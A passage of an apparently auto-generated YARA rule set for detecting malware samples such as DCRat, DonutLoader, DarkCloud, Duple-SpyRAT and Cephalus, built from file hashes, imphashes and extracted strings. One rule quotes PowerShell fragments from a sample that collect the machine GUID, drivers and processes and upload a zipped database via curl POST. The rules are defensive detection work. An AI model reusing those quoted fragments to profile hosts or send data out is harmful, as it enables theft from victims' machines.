      $s3 = "sync/atomic.(*Pointer[go.shape.struct { net.servers []string; net.search []string; net.ndots int; net.timeout time.Duration; net" ascii /* score: '20.00'*/
      $s4 = "net.readHosts.deferwrap1" fullword ascii /* score: '15.00'*/
      $s5 = "net.lookupStaticHost.deferwrap1" fullword ascii /* score: '15.00'*/
      $s6 = "net.(*temporaryError).Error" fullword ascii /* score: '14.00'*/
      $s7 = "*net.temporaryError" fullword ascii /* score: '14.00'*/
      $s8 = "net.compareByRFC6724" fullword ascii /* score: '14.00'*/
      $s9 = "net.(*temporaryError).Timeout" fullword ascii /* score: '14.00'*/
      $s10 = "net.(*temporaryError).Temporary" fullword ascii /* score: '14.00'*/
      $s11 = "vendor/golang.org/x/net/dns/dnsmessage.(*Parser).AdditionalHeader" fullword ascii /* score: '12.00'*/
      $s12 = "internal/singleflight.(*Group).ForgetUnshared.deferwrap1" fullword ascii /* score: '12.00'*/
      $s13 = "net.(*mptcpStatusDial).get" fullword ascii /* score: '12.00'*/
      $s14 = "vendor/golang.org/x/net/dns/dnsmessage.(*ResourceHeader).ExtendedRCode" fullword ascii /* score: '12.00'*/
      $s15 = "net.newDNSError" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _Cephalus_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__691c1d6c_DonutLoade_46 {
   meta:
      description = "_subset_batch - from files Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash2 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash3 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
   strings:
      $s1 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '23.00'*/
      $s2 = "on a locked thread with no template threadunexpected signal during runtime executionstop of synctest timer from outside bubbletr" ascii /* score: '21.00'*/
      $s3 = "areForSweep; sweepgen /cpu/classes/total:cpu-seconds/gc/cycles/automatic:gc-cycles/sched/pauses/total/gc:seconds/sync/mutex/wait" ascii /* score: '20.00'*/
      $s4 = " s.sweepgen= allocCount ProcessPrng" fullword ascii /* score: '20.00'*/
      $s5 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '18.00'*/
      $s6 = "runtime.preventErrorDialogs" fullword ascii /* score: '18.00'*/
      $s7 = "runtime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-" ascii /* score: '18.00'*/
      $s8 = "bindm in unexpected GOOSruntime: mp.lockedInt = runqsteal: runq overflowunexpected syncgroup setdouble traceGCSweepStartbad use " ascii /* score: '15.00'*/
      $s9 = "system huge page size (runtime: s.allocCount= s.allocCount > s.nelems/gc/heap/allocs:objectsmissing type in runfinqruntime: inte" ascii /* score: '15.00'*/
      $s10 = "runtime.pollOperationFromOverlappedEntry" fullword ascii /* score: '15.00'*/
      $s11 = "internal/syscall/windows.ErrorLoadingGetTempPath2" fullword ascii /* score: '15.00'*/
      $s12 = "runtime.getGCMaskOnDemand.osyield.func2" fullword ascii /* score: '15.00'*/
      $s13 = "t failed (errno= racy sudog adjustment due to parking on channelfunction symbol table not sorted by PC offset: attempted to trac" ascii /* score: '14.00'*/
      $s14 = "runtime.Pinner: object already unpinnedsuspendG from non-preemptible goroutineruntime: casfrom_Gscanstatus failed gp=stack growt" ascii /* score: '14.00'*/
      $s15 = " checkdead: find g runlock of unlocked rwmutexsigsend: inconsistent statemakeslice: len out of rangemakeslice: cap out of rangeg" ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _c7e1e07c45dcc3152be6002d0e9be64a_imphash__cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9_cdb0a360_E_piro__47 {
   meta:
      description = "_subset_batch - from files c7e1e07c45dcc3152be6002d0e9be64a(imphash).exe, cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9_cdb0a360.exe, E-piro(signature)_dbc825879296e020d5134f3622c3aca0(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fee550694783280714ddda03ee2bbeb93d8ea769fb7d343b512a47fb3007ad33"
      hash2 = "cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9"
      hash3 = "f9855dccc31c9d330163b9f1fece700d5bc483798f1c0f3ce2cf7364b7423c29"
   strings:
      $s1 = "\\pard\\sb120\\sa120\\b0\\fs19 These license terms are an agreement between Sysinternals (a wholly owned subsidiary of Microsoft" ascii /* score: '26.00'*/
      $s2 = "oration) and you.  Please read them.  They apply to the software you are downloading from Sysinternals.com, which includes the m" ascii /* score: '23.00'*/
      $s3 = "* use the software for commercial software hosting services." fullword wide /* score: '23.00'*/
      $s4 = "* anything related to the software, services, content(including code) on third party Internet sites, or third party programs; an" wide /* score: '20.00'*/
      $s5 = "The software is licensed \"as - is.\" You bear the risk of using it.Sysinternals gives no express warranties, guarantees or cond" wide /* score: '18.00'*/
      $s6 = "process state" fullword wide /* score: '17.00'*/
      $s7 = "\\pard\\fi-357\\li357\\sb120\\sa120\\tx360\\b\\fs20 3.\\tab SENSITIVE INFORMATION. \\b0  Please be aware that, similar to other " ascii /* score: '15.00'*/
      $s8 = "*Internet - based services," fullword wide /* score: '15.00'*/
      $s9 = "This agreement, and the terms for supplements, updates, Internet - based services and support services that you use, are the ent" wide /* score: '15.00'*/
      $s10 = " au logiciel, aux services ou au contenu(y compris le code) figurant sur des sites Internet tiers ou dans des programmes tiers; " wide /* score: '15.00'*/
      $s11 = "s that capture \\ldblquote process state\\rdblquote  information, files saved by Sysinternals tools may include personally ident" ascii /* score: '14.00'*/
      $s12 = "https://www.sysinternals.com0" fullword ascii /* score: '14.00'*/
      $s13 = "\\pard\\keepn\\fi-360\\li720\\sb120\\sa120\\tx720\\lang1036\\'b7\\tab tout  ce qui est reli\\'e9 au logiciel, aux services ou au" ascii /* score: '13.00'*/
      $s14 = "\\pard\\fi-363\\li720\\sb120\\sa120\\tx720\\'b7\\tab anything related to the software, services, content (including code) on thi" ascii /* score: '13.00'*/
      $s15 = "bec, Canada, certaines des clauses dans ce contrat sont fournies ci - dessous en fran" fullword wide /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9_cdb0a360_E_piro_signature__dbc825879296e020d5134f3622c3aca_48 {
   meta:
      description = "_subset_batch - from files cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9_cdb0a360.exe, E-piro(signature)_dbc825879296e020d5134f3622c3aca0(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cdb0a360cca7a5099c2d2357be1a833e032ffdeb3f467a6fac845f6bb77031c9"
      hash2 = "f9855dccc31c9d330163b9f1fece700d5bc483798f1c0f3ce2cf7364b7423c29"
   strings:
      $s1 = "CREATE_PROCESS" fullword wide /* score: '15.00'*/
      $s2 = "ASSIGN_PROCESS" fullword wide /* score: '15.00'*/
      $s3 = "PsIsProtectedProcess" fullword wide /* score: '15.00'*/
      $s4 = "MAP_EXECUTE" fullword wide /* score: '14.00'*/
      $s5 = "MAP_EXECUTE_EXPLICIT" fullword wide /* score: '14.00'*/
      $s6 = "TRAVERSE" fullword wide /* score: '11.50'*/
      $s7 = "SET_THREAD_TOKEN" fullword wide /* score: '10.00'*/
      $s8 = "SeConvertStringSecurityDescriptorToSecurityDescriptor" fullword wide /* score: '10.00'*/
      $s9 = "READOBJECTS" fullword wide /* score: '9.50'*/
      $s10 = "READATTRIBUTES" fullword wide /* score: '9.50'*/
      $s11 = "READSCREEN" fullword wide /* score: '9.50'*/
      $s12 = "VM_OPERATION" fullword wide /* score: '9.00'*/
      $s13 = "GET_CONTEXT" fullword wide /* score: '9.00'*/
      $s14 = "MmGetMaximumNonPagedPoolInBytes" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and ( 8 of them )
      ) or ( all of them )
}

rule _f34d5f2d4577ed6d9ceec516c1f5a744_imphash__25896a7d_f34d5f2d4577ed6d9ceec516c1f5a744_imphash__525b1d1b_f34d5f2d4577ed6d9ceec_49 {
   meta:
      description = "_subset_batch - from files f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_25896a7d.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_525b1d1b.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5a2fecd1.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_667f460c.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7e35e6b6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "25896a7d0a6d9272187b218f59868977c28994cc72097c4e8d3c7124d5d469af"
      hash2 = "525b1d1b28f67c146429743f5ae2508f7cbb3c94006a5487e9db75095e700f89"
      hash3 = "5a2fecd15bb0e0dcea12203aec619231e33babfcec690b1aac3f61bd285134c1"
      hash4 = "667f460c8e274ee05f100b10dce00fa8237b68e05c60c8c95d79fae955a83ca0"
      hash5 = "7e35e6b6fb00b21ddb4a6404d86593d68d6fdad0447ba9cd158c7130e6c7b2a7"
   strings:
      $s1 = "ExpenseSmart - Reports" fullword wide /* score: '15.00'*/
      $s2 = "GetTotalIncome" fullword ascii /* score: '12.00'*/
      $s3 = "<GetTotalIncome>b__9_1" fullword ascii /* score: '12.00'*/
      $s4 = "<GetTotalIncome>b__9_0" fullword ascii /* score: '12.00'*/
      $s5 = "ExpenseSmart - Personal Expense Tracker" fullword wide /* score: '12.00'*/
      $s6 = "ExpenseSmart.Forms.ReportsForm.resources" fullword ascii /* score: '10.00'*/
      $s7 = "ExpenseSmart.Services" fullword ascii /* score: '10.00'*/
      $s8 = "Please enter a description." fullword wide /* score: '10.00'*/
      $s9 = "expenses.xml" fullword wide /* score: '10.00'*/
      $s10 = "<GetTotalSavings>b__10_1" fullword ascii /* score: '9.00'*/
      $s11 = "<GetTotalExpenses>b__8_1" fullword ascii /* score: '9.00'*/
      $s12 = "GetTotalExpenses" fullword ascii /* score: '9.00'*/
      $s13 = "<GetTotalExpenses>b__8_0" fullword ascii /* score: '9.00'*/
      $s14 = "<GetTotalSavings>b__10_0" fullword ascii /* score: '9.00'*/
      $s15 = "GetTotalSavings" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__12e12319f1029ec4f8fcbed7e82df162_imphash__DCRat_signature__fcf1390e9ce472c7270447fc5c61a0c1_imphash__DCRat_50 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash).exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash).exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_3c9a5d90.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_7e30454b.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_ab944f7c.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_b5d0c22e.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_b9168974.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_dac7e634.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_f8292702.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_fdfc8477.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_fe3aca08.exe, DiskWriter(signature)_7c75a83e117d2bdfb2814c53e840c172(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "26fbcc5e8567054c4de9a8514704645e69ffe5eaf91b595d047c90150175c0fa"
      hash2 = "616e24c3e3317ffeeb713f6ef71f469bf4f1e401d44e6594da281c8734bd6baf"
      hash3 = "3c9a5d90d37ba18c0ff3a4e6461cabdf1de6a3eee8890a39e68a1549c433c7e0"
      hash4 = "7e30454bb3e83a895f105099a3d38ad4ca539804bd437052219cb4fe1de153a8"
      hash5 = "ab944f7cb219427b232b32926ac1e7689dcf9eefb6253235bad5c7d541b53ef9"
      hash6 = "b5d0c22e99b421b09938ff885a0a794d3da9f1c2b2b41aa57ad970d230a6c6c7"
      hash7 = "b9168974aee96f657950455bf1933cf18500ae8b1da94a90860fcdafc91b95b4"
      hash8 = "dac7e634f21237813b6404768ea1915ce233f2fdc68a5a29f8b286045379543a"
      hash9 = "f82927022143272ed87aedb2db32ed88bb81956d65f5f701e76d94b8cdc936dd"
      hash10 = "fdfc8477c2be5da54b9db404821c51bc15aa8337073daebaaa0e9b4b360c33b2"
      hash11 = "fe3aca08dfca8765efe0f3e7cf36a6a234e13d8c7451d3e0cb2a040b8d34f9df"
      hash12 = "2ed5fceeb801a4c83914ceff3ac46166490682b81bf481db4687cd1d6b0a16c2"
   strings:
      $x1 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x2 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x3 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x4 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x5 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s6 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s7 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s8 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s9 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s10 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
      $s11 = "WINNSI.DLL" fullword wide /* score: '23.00'*/
      $s12 = "sfxrar.exe" fullword ascii /* score: '22.00'*/
      $s13 = "$GETPASSWORD1:IDOK" fullword ascii /* score: '17.00'*/
      $s14 = "  <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '17.00'*/
      $s15 = "$GETPASSWORD1:SIZE" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Cephalus_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__691c1d6c_da06a1fea0_51 {
   meta:
      description = "_subset_batch - from files Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash2 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash3 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash4 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash5 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
      hash6 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "sync.runtime_SemacquireRWMutex" fullword ascii /* score: '21.00'*/
      $s2 = "sync.runtime_SemacquireRWMutexR" fullword ascii /* score: '21.00'*/
      $s3 = "sync.(*RWMutex).rUnlockSlow" fullword ascii /* score: '18.00'*/
      $s4 = "sync.(*RWMutex).RUnlock" fullword ascii /* score: '18.00'*/
      $s5 = "sync.(*RWMutex).Unlock" fullword ascii /* score: '15.00'*/
      $s6 = "sync.(*RWMutex).RLock" fullword ascii /* score: '15.00'*/
      $s7 = "sync.(*RWMutex).Lock" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.selparkcommit" fullword ascii /* score: '13.00'*/
      $s9 = "time.Date" fullword ascii /* score: '11.00'*/
      $s10 = "internal/reflectlite.(*rtype).Comparable" fullword ascii /* score: '11.00'*/
      $s11 = "runtime.selectnbsend" fullword ascii /* score: '10.00'*/
      $s12 = "strings.Map" fullword ascii /* score: '10.00'*/
      $s13 = "strings.Cut" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.intstring" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.selectgo" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe_e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3d_52 {
   meta:
      description = "_subset_batch - from files da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash2 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
   strings:
      $s1 = "accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-encoded table f=timer moved between " ascii /* score: '22.00'*/
      $s2 = "on a locked thread with no template threadunexpected signal during runtime execution received but handler not on signal stack" fullword ascii /* score: '21.00'*/
      $s3 = "runtime: bad notifyList size - sync=signal arrived during cgo execution" fullword ascii /* score: '20.00'*/
      $s4 = "sync/atomic.(*Pointer[go.shape.struct { os.mu sync.Mutex; os.buf *[]uint8; os.nbuf int; os.bufp int }]).Swap" fullword ascii /* score: '18.00'*/
      $s5 = "sync/atomic.(*Pointer[go.shape.struct { os.mu sync.Mutex; os.buf *[]uint8; os.nbuf int; os.bufp int }]).Store" fullword ascii /* score: '18.00'*/
      $s6 = " checkdead: find g runlock of unlocked rwmutexsignal received during forksigsend: inconsistent statemakeslice: len out of rangem" ascii /* score: '18.00'*/
      $s7 = "sporttls: server selected an invalid version after a HelloRetryRequestx509: policy constraints inhibitPolicyMapping field overfl" ascii /* score: '18.00'*/
      $s8 = "tls: unsupported certificate: private key is %T, expected *%Ttls: EncryptedClientHelloConfigList contains no valid configstls: s" ascii /* score: '16.00'*/
      $s9 = "r timercheckdead: no m for timerunexpected fault address missing stack in newstackbad status in shrinkstackmissing traceGCSweepS" ascii /* score: '15.00'*/
      $s10 = "runtime.vgetrandom" fullword ascii /* score: '15.00'*/
      $s11 = "net.maxListenerBacklog.deferwrap1" fullword ascii /* score: '15.00'*/
      $s12 = "startTheWorld: inconsistent mp->nextpruntime: unexpected SPWRITE function all goroutines are asleep - deadlock!semaphore wake of" ascii /* score: '15.00'*/
      $s13 = "runtime.sysNoHugePage" fullword ascii /* score: '14.00'*/
      $s14 = "runtime.sysNoHugePageOS" fullword ascii /* score: '14.00'*/
      $s15 = "internal/runtime/atomic.(*Pointer[go.shape.struct { runtime.r runtime.profAtomic; runtime.w runtime.profAtomic; runtime.overflow" ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _f34d5f2d4577ed6d9ceec516c1f5a744_imphash__19441aa6_f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4b5ab219_53 {
   meta:
      description = "_subset_batch - from files f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_19441aa6.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4b5ab219.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "19441aa619e783eb0fa5ef40c6ba3a7ac2e6877d043f2ce2152f28cccdf26235"
      hash2 = "4b5ab21936973e603ac60128fd84f60d05bcfcdd8d1ce00dfcabd7786ebe5544"
   strings:
      $x1 = "(Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Cryptography\" -Name \"MachineGuid\" -EA 0).MachineGuid | Out-File $extrac" ascii /* score: '33.00'*/
      $x2 = "$curl = \"curl.exe -X POST -H \"\"content-type: multipart/form-data\"\" -F document=@`\"$env:temp\\database.zip`\" -F chat_id=$c" ascii /* score: '32.00'*/
      $x3 = "$curl = \"curl.exe -X POST -H \"\"content-type: multipart/form-data\"\" -F document=@`\"$env:temp\\database.zip`\" -F chat_id=$c" ascii /* score: '32.00'*/
      $s4 = "                Where-Object { $_ -like \"*.dll\" -and $_ -notlike \"C:\\WINDOWS\\SYSTEM32*\" } " fullword ascii /* score: '29.00'*/
      $s5 = "    $dpv = (Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\").DisplayVersion" fullword ascii /* score: '29.00'*/
      $s6 = "    $windowsVersion = Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\"" fullword ascii /* score: '29.00'*/
      $s7 = "Get-ChildItem -Path \"$env:SystemDrive\\\" -Force > $extractor\\SystemRoot.txt" fullword ascii /* score: '28.00'*/
      $s8 = "(Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Cryptography\" -Name \"MachineGuid\" -EA 0).MachineGuid | Out-File $extrac" ascii /* score: '26.00'*/
      $s9 = "gci -Path \"$env:SystemRoot\\System32\\drivers\" -Filter \"*.sys\" | ForEach-Object { $_.Name } | Out-File -FilePath \"$extracto" ascii /* score: '26.00'*/
      $s10 = "gci -Path \"$env:SystemRoot\\System32\\drivers\" -Filter \"*.sys\" | ForEach-Object { $_.Name } | Out-File -FilePath \"$extracto" ascii /* score: '26.00'*/
      $s11 = "    Get-WmiObject Win32_Process | Select-Object -ExpandProperty Name -Unique | Sort-Object > $extractor\\processes.txt" fullword ascii /* score: '26.00'*/
      $s12 = "gwmi Win32_Service | ? State -eq \"Running\" | Select-Object Name, PathName | Sort-Object Name | Format-Table -Wrap -AutoSize | " ascii /* score: '21.00'*/
      $s13 = "Get-ChildItem -Path \"${env:ProgramFiles(x86)}\\Windows Multimedia Platform\" > \"$VRA\\Windows Multimedia Platform.txt\"" fullword ascii /* score: '20.00'*/
      $s14 = "    $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime" fullword ascii /* score: '19.00'*/
      $s15 = "        Where-Object { $_.ProcessName -notlike \"svchost*\" } | " fullword ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__18491801_e8170b187ba8b1d83defb072a6b18e62fba79b806c0c13b6808_54 {
   meta:
      description = "_subset_batch - from files DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_18491801.exe, e8170b187ba8b1d83defb072a6b18e62fba79b806c0c13b68082424d0c1525c7_e8170b18.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1849180107c4fddc3104670d0c3d0249322b49b3439d7681f6b40922806194ed"
      hash2 = "e8170b187ba8b1d83defb072a6b18e62fba79b806c0c13b68082424d0c1525c7"
   strings:
      $s1 = "\\userscore.bin" fullword wide /* score: '19.00'*/
      $s2 = "GetUserScore" fullword ascii /* score: '17.00'*/
      $s3 = "ProcessWord" fullword ascii /* score: '15.00'*/
      $s4 = "get_BackKey" fullword ascii /* score: '12.00'*/
      $s5 = "get_KeyMatrix" fullword ascii /* score: '12.00'*/
      $s6 = "get_KeyDictionary" fullword ascii /* score: '12.00'*/
      $s7 = "SaveUserScore" fullword ascii /* score: '12.00'*/
      $s8 = "get_EnterKey" fullword ascii /* score: '12.00'*/
      $s9 = "get_help_FILL0_wght300_GRAD0_opsz48" fullword ascii /* score: '9.00'*/
      $s10 = "_darkPen" fullword ascii /* score: '9.00'*/
      $s11 = "GetAnswerList" fullword ascii /* score: '9.00'*/
      $s12 = "get_GamesPlayed" fullword ascii /* score: '9.00'*/
      $s13 = "get_restart_alt_FILL0_wght400_GRAD0_opsz48" fullword ascii /* score: '9.00'*/
      $s14 = "get_restart" fullword ascii /* score: '9.00'*/
      $s15 = "get_NumberOfGuesses" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Duple_SpyRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2a05603f_56 {
   meta:
      description = "_subset_batch - from files Duple-SpyRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2a05603f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0673c02373e23d216ca24a954c34516890ab98acafcfebd801d2f474dd183659"
      hash2 = "2a05603fd3adbd7c74e32248e6da4e52dc8fc1412910c0f473261996ad4f8652"
   strings:
      $s1 = "get_Arg_DllInitFailure" fullword ascii /* score: '17.00'*/
      $s2 = "get_InvalidOperation_RegRemoveSubKey" fullword ascii /* score: '17.00'*/
      $s3 = "get_ObjectDisposed_RegKeyClosed" fullword ascii /* score: '15.00'*/
      $s4 = "get_UnauthorizedAccess_RegistryKeyGeneric_Key" fullword ascii /* score: '15.00'*/
      $s5 = "get_Arg_RegKeyNoRemoteConnect" fullword ascii /* score: '12.00'*/
      $s6 = "get_UnauthorizedAccess_RegistryNoWrite" fullword ascii /* score: '12.00'*/
      $s7 = "get_PlatformNotSupported_Registry" fullword ascii /* score: '12.00'*/
      $s8 = "get_Arg_RegKeyOutOfRange" fullword ascii /* score: '12.00'*/
      $s9 = "get_Arg_RegKeyStrLenBug" fullword ascii /* score: '12.00'*/
      $s10 = "get_Arg_RegKeyDelHive" fullword ascii /* score: '12.00'*/
      $s11 = "get_Arg_RegInvalidKeyName" fullword ascii /* score: '12.00'*/
      $s12 = "get_Argument_InvalidRegistryKeyPermissionCheck" fullword ascii /* score: '12.00'*/
      $s13 = "get_Arg_RegSubKeyAbsent" fullword ascii /* score: '12.00'*/
      $s14 = "get_Arg_RegBadKeyKind" fullword ascii /* score: '12.00'*/
      $s15 = "get_Arg_RegKeyNotFound" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 27000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee_f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca6_57 {
   meta:
      description = "_subset_batch - from files e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
      hash2 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "runtime.sysMmap" fullword ascii /* score: '14.00'*/
      $s2 = "runtime.sysMunmap" fullword ascii /* score: '14.00'*/
      $s3 = "C:/Program Files/Go/src/net/sock_cloexec.go" fullword ascii /* score: '12.00'*/
      $s4 = "runtime.sigaction.func1" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.mmap.func1" fullword ascii /* score: '10.00'*/
